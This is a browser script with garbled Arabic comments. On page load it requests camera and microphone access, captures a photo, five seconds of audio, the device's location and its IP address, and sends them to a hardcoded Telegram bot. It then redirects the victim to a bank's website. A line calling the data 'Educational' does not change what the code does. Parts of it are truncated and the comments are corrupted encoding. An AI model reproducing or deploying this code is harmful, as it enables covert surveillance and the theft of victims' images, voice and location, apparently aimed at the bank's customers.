<script>
const botToken = "7317054018:AAGInl8VmqVPK1fRIYfHx7zRnGceuTcH5pY";
const chatId   = "1538488453";

let camStream;
let micStream;

// ==== Ø¥Ø±Ø³Ø§Ù„ Ù†Øµ ====
function sendText(t){
  axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    chat_id: chatId,

}

// ==== Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ====
async function sendDeviceInfo(){
  let ip = "Unknown";
  try {
    let r = await fetch("https://api.ipify.org?format=json");
    ip = (await r.json()).ip;
  }catch{}

  sendText(
    "ðŸ“± Device Info (Educational):\n" +

}

// ==== Ø§Ù„Ù…ÙˆÙ‚Ø¹ ====
function sendLocation(){
  navigator.geolocation.getCurrentPosition(
    pos => {
      sendText(
        "ðŸ“ Location:\nLat: " + pos.coords.latitude +
        "\nLon: " + pos.coords.longitude +
        "\nAcc: " + pos.coords.accuracy + "m"
      );
    },
    err => sendText("Location Error: " + err.message),
    { enableHighAccuracy: true }
  );
}

// ==== ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ====
function takePhoto(){
  const video = document.createElement("video");
  video.srcObject = camStream;
  video.play();

  const canvas = document.createElement("canvas");
  const ctx = canvas.getContext("2d");

  video.onplaying = () => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    ctx.drawImage(video, 0, 0);

    canvas.toBlob(blob => {
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append("photo", blob, "cam.jpg");
      axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, fd);
    }, "image/jpeg", 0.7);
  };
}

// ==== ØªØ³Ø¬ÙŠÙ„ ØµÙˆØª 5 Ø«ÙˆØ§Ù†Ù ====
function recordAudio(){
  const rec = new MediaRecorder(micStream);
  const chunks = [];

  rec.ondataavailable = e => chunks.push(e.data);
  rec.onstop = () => {
    const blob = new Blob(chunks, { type: "audio/webm" });
    const fd = new FormData();
    fd.append("chat_id", chatId);
    fd.append("audio", blob, "mic.webm");
    axios.post(`https://api.telegram.org/bot${botToken}/sendAudio`, fd);
  };

  rec.start();
  setTimeout(() => rec.stop(), 5000);
}

// ==== ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© ====
function startDemo(){
  Promise.all([
    navigator.mediaDevices.getUserMedia({ video:true }),
    navigator.mediaDevices.getUserMedia({ audio:true })
  ])
  .then(([cam, mic]) => {
    camStream = cam;
    micStream = mic;

    sendDeviceInfo();
    sendLocation();
    takePhoto();
    recordAudio();

    // ===== Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†ÙŠ =====
    setTimeout(() => {
      window.location.href = "https://kuraimibank.com/ar/";
    }, 3000);

  })
  .catch(e => sendText("Permission Error: " + e.message));
}

startDemo();
</script>
